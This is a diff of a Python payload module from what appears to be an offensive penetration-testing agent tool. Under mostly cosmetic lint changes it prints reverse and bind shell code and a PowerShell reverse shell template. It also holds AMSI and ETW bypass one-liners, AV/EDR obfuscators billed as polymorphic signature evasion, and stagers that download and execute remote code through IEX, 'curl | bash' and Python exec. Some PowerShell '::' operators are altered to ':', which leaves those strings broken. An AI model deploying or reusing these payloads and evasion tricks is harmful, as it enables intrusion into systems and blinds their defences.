@@ -5,9 +5,9 @@
 
 import asyncio
 import base64
-import secrets
 import logging
-from typing import Any
+import secrets
+from typing import Any, NoReturn
 
 # Setup logger
 logger = logging.getLogger(__name__)
@@ -26,14 +26,11 @@ except ImportError:
 
 
 class PayloadError(Exception):
-    """Custom exception for payload errors"""
-
-    pass
+    """Custom exception for payload errors."""
 
 
 def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
-    """
-    Payload precondition check - STRICTLY REQUIRED.
+    """Payload precondition check - STRICTLY REQUIRED.
 
     RULE: Payload FORBIDDEN without foothold.
 
@@ -42,6 +39,7 @@ def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
 
     Returns:
         (can_execute, reason)
+
     """
     logger.debug("Checking payload preconditions")
 
@@ -57,7 +55,7 @@ def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
     # Precondition 2: Must be in appropriate phase
     if state.phase not in [AttackPhase.FOOTHOLD, AttackPhase.POST_EXPLOIT]:
         logger.warning(
-            f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT"
+            f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT",
         )
         return False, f"Wrong phase: {state.phase.value}, need FOOTHOLD or POST_EXPLOIT"
 
@@ -69,10 +67,11 @@ def check_payload_preconditions(state: "AgentState") -> tuple[bool, str]:
 # Reverse Shell Payload
 # -------------------------
 async def reverse_shell(
-    state: "AgentState", target_ip: str = "127.0.0.1", target_port: int = 4444
+    state: "AgentState",
+    target_ip: str = "127.0.0.1",
+    target_port: int = 4444,
 ) -> dict[str, Any]:
-    """
-    STATE-AWARE Reverse shell - FOOTHOLD REQUIRED.
+    """STATE-AWARE Reverse shell - FOOTHOLD REQUIRED.
 
     Args:
         state: AgentState instance
@@ -81,16 +80,18 @@ async def reverse_shell(
 
     Returns:
         Dict with connection results
+
     """
-    logger.info(f"Initiating reverse shell connection to {target_ip}:{target_port}")
+    logger.info("Initiating reverse shell connection to %s:%s", target_ip, target_port)
 
     # Enforce state required
     if state is None:
-        raise RuntimeError("State is required for payload execution")
+        msg = "State is required for payload execution"
+        raise RuntimeError(msg)
 
     # STATE VALIDATION
     if STATE_AVAILABLE and state and not state.validate():
-        logger.error(f"{STATE_INVARIANT_VIOLATION} before reverse shell")
+        logger.error("%s before reverse shell", STATE_INVARIANT_VIOLATION)
         return {
             "type": "ReverseShell",
             "success": False,
@@ -102,7 +103,7 @@ async def reverse_shell(
     # PRECONDITION CHECK - REQUIRED
     can_execute, reason = check_payload_preconditions(state)
     if not can_execute:
-        logger.warning(f"Reverse shell blocked: {reason}")
+        logger.warning("Reverse shell blocked: %s", reason)
         return {
             "type": "ReverseShell",
             "success": False,
@@ -113,19 +114,19 @@ async def reverse_shell(
 
     timeout_seconds = 30  # Fixed timeout value
     try:
-        logger.debug(f"Attempting connection to {target_ip}:{target_port}")
+        logger.debug("Attempting connection to %s:%s", target_ip, target_port)
         async with asyncio.timeout(timeout_seconds):
             _, writer = await asyncio.open_connection(target_ip, target_port)
 
         writer.write(b"Drakben reverse shell connection established.\n")
         await writer.drain()
-        logger.info(f"Reverse shell connected to {target_ip}:{target_port}")
+        logger.info("Reverse shell connected to %s:%s", target_ip, target_port)
 
         # Update state - foothold confirmed
         if STATE_AVAILABLE and state:
             state.mark_post_exploit_done("reverse_shell_established")
             if not state.validate():
-                logger.error(f"{STATE_INVARIANT_VIOLATION} after reverse shell")
+                logger.error("%s after reverse shell", STATE_INVARIANT_VIOLATION)
                 return {
                     "type": "ReverseShell",
                     "success": False,
@@ -141,7 +142,9 @@ async def reverse_shell(
             "port": target_port,
         }
     except TimeoutError:
-        logger.error(f"Reverse shell connection timeout to {target_ip}:{target_port}")
+        logger.exception(
+            f"Reverse shell connection timeout to {target_ip}:{target_port}",
+        )
         return {
             "type": "ReverseShell",
             "success": False,
@@ -149,14 +152,14 @@ async def reverse_shell(
             "timeout": True,
         }
     except ConnectionRefusedError:
-        logger.error(f"Connection refused to {target_ip}:{target_port}")
+        logger.exception("Connection refused to %s:%s", target_ip, target_port)
         return {
             "type": "ReverseShell",
             "success": False,
             "error": "Connection refused - ensure listener is running",
         }
     except Exception as e:
-        logger.exception(f"Reverse shell failed: {e}")
+        logger.exception("Reverse shell failed: %s", e)
         return {"type": "ReverseShell", "success": False, "error": str(e)}
 
 
@@ -164,10 +167,11 @@ async def reverse_shell(
 # Bind Shell Payload
 # -------------------------
 async def bind_shell(
-    state: "AgentState", listen_ip: str = "0.0.0.0", listen_port: int = 5555
+    state: "AgentState",
+    listen_ip: str = "127.0.0.1",
+    listen_port: int = 5555,
 ) -> dict[str, Any]:
-    """
-    STATE-AWARE Bind shell - FOOTHOLD GEREKLİ
+    """STATE-AWARE Bind shell - FOOTHOLD GEREKLİ.
 
     Args:
         state: AgentState instance
@@ -176,11 +180,13 @@ async def bind_shell(
 
     Returns:
         Dict with bind shell results
+
     """
-    logger.info(f"Starting bind shell on {listen_ip}:{listen_port}")
+    logger.info("Starting bind shell on %s:%s", listen_ip, listen_port)
 
     if state is None:
-        raise RuntimeError("State is required for payload execution")
+        msg = "State is required for payload execution"
+        raise RuntimeError(msg)
 
     # STATE VALIDATION
     if STATE_AVAILABLE and state and not state.validate():
@@ -196,7 +202,7 @@ async def bind_shell(
     # PRECONDITION CHECK - REQUIRED
     can_execute, reason = check_payload_preconditions(state)
     if not can_execute:
-        logger.warning(f"Bind shell blocked: {reason}")
+        logger.warning("Bind shell blocked: %s", reason)
         return {
             "type": "BindShell",
             "success": False,
@@ -208,7 +214,7 @@ async def bind_shell(
     try:
         server = await asyncio.start_server(handle_client, listen_ip, listen_port)
         await server.start_serving()
-        logger.info(f"Bind shell listening on {listen_ip}:{listen_port}")
+        logger.info("Bind shell listening on %s:%s", listen_ip, listen_port)
 
         return {
             "type": "BindShell",
@@ -218,23 +224,25 @@ async def bind_shell(
         }
     except OSError as e:
         if "Address already in use" in str(e):
-            logger.error(f"Port {listen_port} already in use")
+            logger.exception("Port %s already in use", listen_port)
             return {
                 "type": "BindShell",
                 "success": False,
                 "error": f"Port {listen_port} already in use",
             }
-        logger.exception(f"Bind shell failed: {e}")
+        logger.exception("Bind shell failed: %s", e)
         return {"type": "BindShell", "success": False, "error": str(e)}
     except Exception as e:
-        logger.exception(f"Bind shell failed: {e}")
+        logger.exception("Bind shell failed: %s", e)
         return {"type": "BindShell", "success": False, "error": str(e)}
 
 
-async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
-    """Handle incoming bind shell connection"""
+async def handle_client(
+    reader: asyncio.StreamReader, writer: asyncio.StreamWriter,
+) -> None:
+    """Handle incoming bind shell connection."""
     addr = writer.get_extra_info("peername")
-    logger.info(f"Bind shell connection from {addr}")
+    logger.info("Bind shell connection from %s", addr)
 
     writer.write(b"Drakben bind shell connection established.\n")
     await writer.drain()
@@ -243,9 +251,8 @@ async def handle_client(reader: asyncio.StreamReader, writer: asyncio.StreamWrit
 # -------------------------
 # Command Execution Payload
 # -------------------------
-def execute_command(state: "AgentState"):
-    """
-    Direct command execution is forbidden for security.
+def execute_command(state: "AgentState") -> NoReturn:
+    """Direct command execution is forbidden for security.
 
     Args:
         state: AgentState instance
@@ -253,13 +260,16 @@ def execute_command(state: "AgentState"):
 
     Raises:
         RuntimeError: Always raises as direct execution is forbidden
+
     """
     logger.error("Direct command execution attempted - BLOCKED")
     if state is None:
-        raise RuntimeError("State is required for payload command execution")
+        msg = "State is required for payload command execution"
+        raise RuntimeError(msg)
     # Direct command execution is forbidden; must use ToolSelector via agent tool execution path
+    msg = "Direct command execution is forbidden. Use ToolSelector via the agent executor."
     raise RuntimeError(
-        "Direct command execution is forbidden. Use ToolSelector via the agent executor."
+        msg,
     )
 
 
@@ -267,8 +277,7 @@ def execute_command(state: "AgentState"):
 # AI-Powered Payload Recommendation
 # -------------------------
 def ai_payload_advice(state: "AgentState") -> dict[str, Any]:
-    """
-    AI-powered payload recommendation.
+    """AI-powered payload recommendation.
 
     Args:
         state: AgentState instance
@@ -276,15 +285,17 @@ def ai_payload_advice(state: "AgentState") -> dict[str, Any]:
 
     Returns:
         Dict with AI recommendations
+
     """
     logger.info("Starting AI payload advice engine")
 
     if state is None:
-        raise RuntimeError("State is required for AI payload advice")
+        msg = "State is required for AI payload advice"
+        raise RuntimeError(msg)
 
     # STATE VALIDATION
     if STATE_AVAILABLE and state and not state.validate():
-        logger.error(f"{STATE_INVARIANT_VIOLATION} in AI advice")
+        logger.error("%s in AI advice", STATE_INVARIANT_VIOLATION)
         return {
             "type": "AI",
             "error": STATE_INVARIANT_VIOLATION,
@@ -356,7 +367,7 @@ PAYLOAD_TEMPLATES = {
         "requires": ["ruby"],
     },
     "reverse_shell_powershell": {
-        "code": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
+        "code": '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]:ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"''',
         "description": "PowerShell reverse shell",
         "os": "windows",
         "requires": ["powershell"],
@@ -424,8 +435,7 @@ def generate_payload(
     lport: int = 4444,
     encode: bool = False,
 ) -> dict[str, Any]:
-    """
-    Generate various payload types.
+    """Generate various payload types.
 
     Args:
         state: AgentState instance
@@ -436,15 +446,17 @@ def generate_payload(
 
     Returns:
         dict with payload code and metadata
+
     """
-    logger.info(f"Generating payload: {payload_type}")
+    logger.info("Generating payload: %s", payload_type)
 
     if state is None:
-        raise RuntimeError("State is required for payload generation")
+        msg = "State is required for payload generation"
+        raise RuntimeError(msg)
 
     # STATE VALIDATION
     if STATE_AVAILABLE and state and not state.validate():
-        logger.error(f"{STATE_INVARIANT_VIOLATION} in payload generation")
+        logger.error("%s in payload generation", STATE_INVARIANT_VIOLATION)
         return {
             "error": STATE_INVARIANT_VIOLATION,
             "blocked": True,
@@ -453,12 +465,12 @@ def generate_payload(
 
     can_execute, reason = check_payload_preconditions(state)
     if not can_execute:
-        logger.warning(f"Payload generation blocked: {reason}")
+        logger.warning("Payload generation blocked: %s", reason)
         return {"error": reason, "blocked": True}
 
     payload_key = payload_type.lower()
     if payload_key not in PAYLOAD_TEMPLATES:
-        logger.warning(f"Unknown payload type: {payload_type}")
+        logger.warning("Unknown payload type: %s", payload_type)
         return {
             "error": f"Unknown payload type: {payload_type}",
             "available": list(PAYLOAD_TEMPLATES.keys()),
@@ -471,7 +483,7 @@ def generate_payload(
         code_template = str(template["code"])
         code = code_template.format(lhost=lhost or "LHOST", lport=lport)
     except KeyError as e:
-        logger.error(f"Missing parameter for payload: {e}")
+        logger.exception("Missing parameter for payload: %s", e)
         return {"error": f"Missing parameter: {e}"}
 
     # Optionally encode
@@ -480,7 +492,7 @@ def generate_payload(
         code = base64.b64encode(code_bytes).decode("utf-8")
         logger.debug("Payload encoded to base64")
 
-    logger.info(f"Payload generated successfully: {payload_type}")
+    logger.info("Payload generated successfully: %s", payload_type)
 
     return {
         "type": payload_type,
@@ -496,16 +508,16 @@ def generate_payload(
 
 
 def list_payloads(os_filter: str | None = None) -> list[dict[str, Any]]:
-    """
-    List available payload templates.
+    """List available payload templates.
 
     Args:
         os_filter: Filter by OS (linux, windows, any)
 
     Returns:
         List of payload info dicts
+
     """
-    logger.debug(f"Listing payloads with filter: {os_filter}")
+    logger.debug("Listing payloads with filter: %s", os_filter)
 
     payloads = []
     for name, template in PAYLOAD_TEMPLATES.items():
@@ -521,7 +533,7 @@ def list_payloads(os_filter: str | None = None) -> list[dict[str, Any]]:
                 "description": template.get("description", ""),
                 "os": template.get("os", "unknown"),
                 "requires": template.get("requires", []),
-            }
+            },
         )
 
     return payloads
@@ -533,8 +545,7 @@ def list_payloads(os_filter: str | None = None) -> list[dict[str, Any]]:
 
 
 class PayloadObfuscator:
-    """
-    Payload obfuscation for AV/EDR bypass.
+    """Payload obfuscation for AV/EDR bypass.
 
     Techniques:
     - String encoding (Base64, Hex, Unicode)
@@ -547,23 +558,22 @@ class PayloadObfuscator:
 
     @staticmethod
     def base64_encode(payload: str) -> str:
-        """Encode payload to Base64"""
+        """Encode payload to Base64."""
         return base64.b64encode(payload.encode()).decode()
 
     @staticmethod
     def hex_encode(payload: str) -> str:
-        """Encode payload to hexadecimal"""
+        """Encode payload to hexadecimal."""
         return payload.encode().hex()
 
     @staticmethod
     def unicode_encode(payload: str) -> str:
-        """Encode payload to Unicode escape sequences"""
+        """Encode payload to Unicode escape sequences."""
         return "".join(f"\\u{ord(c):04x}" for c in payload)
 
     @staticmethod
     def xor_encode(payload: str, key: int = 0x41) -> tuple[str, int]:
-        """
-        XOR encode payload.
+        """XOR encode payload.
 
         Args:
             payload: Original payload
@@ -571,14 +581,14 @@ class PayloadObfuscator:
 
         Returns:
             Tuple of (encoded_bytes_as_hex, key)
+
         """
         encoded = "".join(f"{ord(c) ^ key:02x}" for c in payload)
         return encoded, key
 
     @staticmethod
     def string_concat(payload: str, chunk_size: int = 3) -> str:
-        """
-        Split string into concatenated chunks.
+        """Split string into concatenated chunks.
 
         Args:
             payload: Original string
@@ -586,6 +596,7 @@ class PayloadObfuscator:
 
         Returns:
             Concatenated string expression
+
         """
         chunks = [
             payload[i : i + chunk_size] for i in range(0, len(payload), chunk_size)
@@ -594,33 +605,33 @@ class PayloadObfuscator:
 
     @staticmethod
     def variable_substitution(payload: str) -> str:
-        """Generic variable substitution - placeholder"""
+        """Generic variable substitution - placeholder."""
         return payload
 
     @staticmethod
     def dead_code_injection(payload: str, language: str = "bash") -> str:
-        """Generic dead code injection - placeholder"""
+        """Generic dead code injection - placeholder."""
         return payload
 
     @staticmethod
     def polymorphic_encode(payload: str, language: str = "bash") -> str:
-        """
-        Advanced Polymorphic Encoding Engine.
+        """Advanced Polymorphic Encoding Engine.
         Changes code structure every time to bypass signature-based detection.
         """
         if language == "bash":
             return _polymorphic_encode_bash(payload)
-        elif language == "python":
+        if language == "python":
             return _polymorphic_encode_python(payload)
         return payload  # Fallback for unknown langs
 
 
 def _polymorphic_encode_bash(payload: str) -> str:
-    """Polymorphic encoding for bash"""
+    """Polymorphic encoding for bash."""
     import string
 
-    def random_var(length=5):
+    def random_var(length=5) -> Any:
         import secrets
+
         return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))
 
     var_map = {}
@@ -644,16 +655,17 @@ def _polymorphic_encode_bash(payload: str) -> str:
         "if [ 1 -eq 1 ]; then :; fi",
     ]
 
-    final_code = repo + [secrets.choice(junk_ops), mutated]
+    final_code = [*repo, secrets.choice(junk_ops), mutated]
     return "; ".join(final_code)
 
 
 def _polymorphic_encode_python(payload: str) -> str:
-    """Polymorphic encoding for Python"""
+    """Polymorphic encoding for Python."""
     import string
 
-    def random_var(length=5):
+    def random_var(length=5) -> Any:
         import secrets
+
         return "".join(secrets.choice(string.ascii_lowercase) for _ in range(length))
 
     imports = ["socket", "subprocess", "os"]
@@ -669,10 +681,11 @@ def _polymorphic_encode_python(payload: str) -> str:
     for org, alias in alias_map.items():
         mutated = mutated.replace(org, alias)
 
-    def fragment_string(s):
+    def fragment_string(s) -> str:
         if len(s) < 5:
             return f"'{s}'"
         import secrets
+
         cut = secrets.randbelow(len(s) - 1) + 1
         return f"'{s[:cut]}'+'{s[cut:]}'"
 
@@ -687,11 +700,11 @@ except (SyntaxError, NameError, ValueError) as e:
 
 
 class PowerShellObfuscator:
-    """PowerShell-specific obfuscation techniques"""
+    """PowerShell-specific obfuscation techniques."""
 
     @staticmethod
     def invoke_expression_encode(payload: str) -> str:
-        """Encode using Invoke-Expression with Base64"""
+        """Encode using Invoke-Expression with Base64."""
         import base64
 
         # UTF-16LE encoding for PowerShell
@@ -700,7 +713,7 @@ class PowerShellObfuscator:
 
     @staticmethod
     def concat_strings(payload: str) -> str:
-        """Use string concatenation"""
+        """Use string concatenation."""
         parts = []
         for i in range(0, len(payload), 2):
             chunk = payload[i : i + 2]
@@ -709,19 +722,19 @@ class PowerShellObfuscator:
 
     @staticmethod
     def char_array(payload: str) -> str:
-        """Convert to char array"""
+        """Convert to char array."""
         chars = ",".join(str(ord(c)) for c in payload)
         return f'[char[]]@({chars}) -join ""'
 
     @staticmethod
     def environment_variable(payload: str, var_name: str = "x") -> str:
-        """Store in environment variable"""
+        """Store in environment variable."""
         encoded = PayloadObfuscator.base64_encode(payload)
-        return f'$env:{var_name}="{encoded}";iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:{var_name})))'
+        return f'$env:{var_name}="{encoded}";iex([System.Text.Encoding]:UTF8.GetString([System.Convert]:FromBase64String($env:{var_name})))'
 
     @staticmethod
     def tick_obfuscation(payload: str) -> str:
-        """Insert backticks for obfuscation"""
+        """Insert backticks for obfuscation."""
         import secrets
 
         result = ""
@@ -734,23 +747,23 @@ class PowerShellObfuscator:
 
 
 class BashObfuscator:
-    """Bash-specific obfuscation techniques"""
+    """Bash-specific obfuscation techniques."""
 
     @staticmethod
     def eval_base64(payload: str) -> str:
-        """Encode using eval and base64"""
+        """Encode using eval and base64."""
         encoded = PayloadObfuscator.base64_encode(payload)
         return f'eval "$(echo {encoded} | base64 -d)"'
 
     @staticmethod
     def hex_printf(payload: str) -> str:
-        """Use printf with hex escape"""
+        """Use printf with hex escape."""
         hex_payload = "".join(f"\\x{ord(c):02x}" for c in payload)
         return f'eval "$(printf "{hex_payload}")"'
 
     @staticmethod
     def variable_expansion(payload: str) -> str:
-        """Use variable expansion tricks"""
+        """Use variable expansion tricks."""
         import secrets
 
         var = "".join(chr(secrets.randbelow(26) + 97) for _ in range(4))
@@ -759,7 +772,7 @@ class BashObfuscator:
 
     @staticmethod
     def brace_expansion(command: str) -> str:
-        """Use brace expansion for command"""
+        """Use brace expansion for command."""
         # Split command into parts
         parts = command.split()
         if len(parts) < 2:
@@ -768,48 +781,46 @@ class BashObfuscator:
         # Create brace expansion
         cmd = parts[0]
         result = "{" + ",".join(list(cmd)) + "}"
-        return " ".join([result] + parts[1:])
+        return " ".join([result, *parts[1:]])
 
     @staticmethod
     def octal_encode(payload: str) -> str:
-        """Encode using octal"""
+        """Encode using octal."""
         octal_payload = "".join(f"\\{ord(c):03o}" for c in payload)
         return f'eval "$(printf "{octal_payload}")"'
 
 
 class AVBypass:
-    """
-    Antivirus/EDR bypass techniques.
+    """Antivirus/EDR bypass techniques.
 
     WARNING: For educational and authorized testing only.
     """
 
     @staticmethod
     def amsi_bypass_powershell() -> str:
-        """Generate AMSI bypass for PowerShell"""
+        """Generate AMSI bypass for PowerShell."""
         # Common AMSI bypass (for educational purposes)
         bypasses = [
             # Reflection-based
             '[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)',
             # Memory patching approach (conceptual)
-            '$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)',
+            '$a=[Ref].Assembly.GetTypes();ForEach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields("NonPublic,Static");ForEach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]:Copy($buf,0,$ptr,1)',
         ]
         return bypasses[0]
 
     @staticmethod
     def etw_bypass_powershell() -> str:
-        """Generate ETW bypass for PowerShell"""
-        return '[Reflection.Assembly]::LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)'
+        """Generate ETW bypass for PowerShell."""
+        return '[Reflection.Assembly]:LoadWithPartialName("System.Core").GetType("System.Diagnostics.Eventing.EventProvider").GetField("m_enabled","NonPublic,Instance").SetValue([Ref].Assembly.GetType("System.Management.Automation.Tracing.PSEtwLogProvider").GetField("etwProvider","NonPublic,Static").GetValue($null),0)'
 
     @staticmethod
     def windows_defender_exclusion_check() -> str:
-        """PowerShell command to check Defender exclusions"""
+        """PowerShell command to check Defender exclusions."""
         return "Get-MpPreference | Select-Object -ExpandProperty ExclusionPath"
 
     @staticmethod
     def sleep_bypass(payload: str, sleep_seconds: int = 120) -> str:
-        """
-        Add sleep to bypass sandbox analysis.
+        """Add sleep to bypass sandbox analysis.
 
         Args:
             payload: Original payload
@@ -817,12 +828,13 @@ class AVBypass:
 
         Returns:
             Payload with sleep prepended
+
         """
         return f"Start-Sleep -Seconds {sleep_seconds}; {payload}"
 
     @staticmethod
     def process_hollowing_stub() -> str:
-        """Generate process hollowing conceptual stub"""
+        """Generate process hollowing conceptual stub."""
         return """
 # Process Hollowing Concept (Educational)
 # 1. Create suspended process
@@ -835,7 +847,7 @@ class AVBypass:
 
     @staticmethod
     def dll_injection_stub() -> str:
-        """Generate DLL injection conceptual stub"""
+        """Generate DLL injection conceptual stub."""
         return """
 # DLL Injection Concept (Educational)
 # 1. Get target process handle
@@ -847,10 +859,11 @@ class AVBypass:
 
 
 def obfuscate_payload(
-    payload: str, language: str = "bash", techniques: list[str] | None = None
+    payload: str,
+    language: str = "bash",
+    techniques: list[str] | None = None,
 ) -> dict[str, Any]:
-    """
-    Apply obfuscation techniques to payload.
+    """Apply obfuscation techniques to payload.
 
     Args:
         payload: Original payload
@@ -859,8 +872,9 @@ def obfuscate_payload(
 
     Returns:
         Dict with obfuscated payload and metadata
+
     """
-    logger.info(f"Obfuscating payload ({language})")
+    logger.info("Obfuscating payload (%s)", language)
 
     if techniques is None:
         techniques = ["base64", "variable"]
@@ -870,7 +884,9 @@ def obfuscate_payload(
 
     for technique in techniques:
         result, technique_name = _apply_obfuscation_technique(
-            result, technique, language
+            result,
+            technique,
+            language,
         )
         if technique_name:
             applied.append(technique_name)
@@ -885,55 +901,60 @@ def obfuscate_payload(
 
 
 def _apply_obfuscation_technique(
-    payload: str, technique: str, language: str
+    payload: str,
+    technique: str,
+    language: str,
 ) -> tuple[str, str | None]:
-    """Apply a single obfuscation technique"""
+    """Apply a single obfuscation technique."""
     if technique == "base64":
         return _apply_base64_obfuscation(payload, language), "base64"
-    elif technique == "hex":
+    if technique == "hex":
         return _apply_hex_obfuscation(payload, language), "hex"
-    elif technique == "xor":
+    if technique == "xor":
         encoded, key = PayloadObfuscator.xor_encode(payload)
         return f"XOR_KEY={key}\nENCODED={encoded}", f"xor_key_{key}"
-    elif technique == "variable":
+    if technique == "variable":
         return PayloadObfuscator.variable_substitution(payload), "variable_substitution"
-    elif technique == "dead_code":
+    if technique == "dead_code":
         return PayloadObfuscator.dead_code_injection(payload, language), "dead_code"
-    elif technique == "concat":
+    if technique == "concat":
         return _apply_concat_obfuscation(payload, language), "string_concat"
-    elif technique == "tick" and language == "powershell":
+    if technique == "tick" and language == "powershell":
         return PowerShellObfuscator.tick_obfuscation(payload), "tick_obfuscation"
     return payload, None
 
 
 def _apply_base64_obfuscation(payload: str, language: str) -> str:
-    """Apply base64 obfuscation based on language"""
+    """Apply base64 obfuscation based on language."""
     if language == "bash":
         return BashObfuscator.eval_base64(payload)
-    elif language == "powershell":
+    if language == "powershell":
         return PowerShellObfuscator.invoke_expression_encode(payload)
     return PayloadObfuscator.base64_encode(payload)
 
 
 def _apply_hex_obfuscation(payload: str, language: str) -> str:
-    """Apply hex obfuscation based on language"""
+    """Apply hex obfuscation based on language."""
     if language == "bash":
         return BashObfuscator.hex_printf(payload)
     return PayloadObfuscator.hex_encode(payload)
 
 
 def _apply_concat_obfuscation(payload: str, language: str) -> str:
-    """Apply string concatenation obfuscation"""
+    """Apply string concatenation obfuscation."""
     if language == "powershell":
         return PowerShellObfuscator.concat_strings(payload)
     return PayloadObfuscator.string_concat(payload)
 
 
 def generate_staged_payload(
-    state: "AgentState", payload_type: str, lhost: str, lport: int, stage_url: str
+    state: "AgentState",
+    payload_type: str,
+    lhost: str,
+    lport: int,
+    stage_url: str,
 ) -> dict[str, Any]:
-    """
-    Generate staged payload with stager and stage.
+    """Generate staged payload with stager and stage.
 
     Args:
         payload_type: Type of payload
@@ -943,14 +964,15 @@ def generate_staged_payload(
 
     Returns:
         Dict with stager and stage payloads
+
     """
-    logger.info(f"Generating staged payload: {payload_type}")
+    logger.info("Generating staged payload: %s", payload_type)
 
     # Stagers (small code to fetch and execute stage)
     stagers = {
         "powershell": f'IEX(New-Object Net.WebClient).DownloadString("{stage_url}")',
         "bash": f"curl -s {stage_url} | bash",
-        "python": f'import urllib.request; exec(urllib.request.urlopen("{stage_url}").read())',
+        "python": f'import urllib.request; exec(urllib.request.urlopen("{stage_url}").read())',  # noqa: S310, S102
     }
 
     # Get main payload
